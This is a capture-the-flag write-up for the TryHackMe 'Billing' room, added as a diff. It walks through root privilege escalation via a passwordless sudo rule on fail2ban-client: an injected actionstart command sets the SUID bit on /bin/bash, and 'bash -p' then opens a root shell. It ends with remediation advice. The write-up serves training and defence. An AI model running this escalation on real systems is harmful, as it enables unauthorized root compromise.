@@ -1,0 +1,118 @@
+Fail2Ban Privilege Escalation Write-Up
+📋 Challenge Overview
+
+Field	Details
+Platform	TryHackMe
+Room	Billing
+Difficulty	Medium
+Category	Privilege Escalation
+Vulnerability	Fail2Ban Misconfiguration
+🔍 Reconnaissance
+After gaining initial access to the target machine, we need to enumerate possible privilege escalation vectors.
+Checking sudo permissions
+bash
+Copy code
+sudo -l
+Output:
+User www-data may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/fail2ban-client
+This reveals that we can run fail2ban-client as root without a password — a critical misconfiguration!
+
+🎯 Vulnerability Analysis
+What is Fail2Ban?
+Fail2Ban is an intrusion prevention software that protects servers from brute-force attacks by monitoring log files and banning suspicious IP addresses.
+The Security Issue
+When a user has sudo access to fail2ban-client, they can:
+1. Create custom actions with arbitrary commands
+2. These actions execute with root privileges
+3. Trigger the actions by restarting a jail
+
+💀 Exploitation
+Step 1: Create Malicious Action
+bash
+Copy code
+sudo /usr/bin/fail2ban-client set sshd action evil actionstart "chmod u+s /bin/bash"
+
+Breakdown:
+* set sshd — Target the SSH jail
+* action evil — Create action named "evil"
+* actionstart — Command runs when jail starts
+* chmod u+s /bin/bash — Set SUID bit on bash
+Step 2: Trigger the Action
+bash
+Copy code
+sudo /usr/bin/fail2ban-client restart sshd
+Restarting the jail executes our actionstart command as root.
+Step 3: Verify SUID Bit
+bash
+Copy code
+ls -la /bin/bash
+Output:
+-rwsr-xr-x 1 root root 1183448 /bin/bash
+
+✅ The s in -rwsr-xr-x confirms SUID bit is set!
+Step 4: Spawn Root Shell
+bash
+Copy code
+bash -p
+The -p flag preserves elevated privileges, preventing bash from dropping SUID permissions.
+Step 5: Confirm Root Access
+bash
+Copy code
+whoami
+Output:
+root
+
+🏆 Capturing the Flags
+User Flag
+bash
+Copy code
+cat /home/user/user.txt
+Root Flag
+bash
+Copy code
+cat /root/root.txt
+
+📊 Attack Flow Diagram
+┌────────────────────────────────────┐
+│     Initial Access (www-data)      │
+└──────────────┬─────────────────────┘
+               │
+               ▼
+┌────────────────────────────────────┐
+│   Enumerate: sudo -l               │
+│   Found: fail2ban-client NOPASSWD  │
+└──────────────┬─────────────────────┘
+               │
+               ▼
+┌────────────────────────────────────┐
+│   Inject malicious actionstart     │
+│   Command: chmod u+s /bin/bash     │
+└──────────────┬─────────────────────┘
+               │
+               ▼
+┌────────────────────────────────────┐
+│   Restart sshd jail                │
+│   → Triggers actionstart as root   │
+└──────────────┬─────────────────────┘
+               │
+               ▼
+┌────────────────────────────────────┐
+│   bash -p → ROOT SHELL             │
+└────────────────────────────────────┘
+
+🛡️ Remediation
+
+Recommendation	Description
+Restrict sudo access	Never allow unprivileged users to run fail2ban-client as root
+Use allowlist	If sudo access is required, limit to specific safe commands
+Monitor SUID changes	Implement file integrity monitoring for critical binaries
+Apply least privilege	Run Fail2Ban with minimal required permissions
+📚 References
+* GTFOBins - Fail2Ban
+* Fail2Ban Documentation
+* SUID Privilege Escalation
+
+🏁 Conclusion
+This challenge demonstrates the dangers of misconfigured sudo permissions. By allowing unrestricted access to fail2ban-client, an attacker can leverage its action system to execute arbitrary commands as root, leading to complete system compromise.
+Key Takeaway: Always follow the principle of least privilege when configuring sudo access!
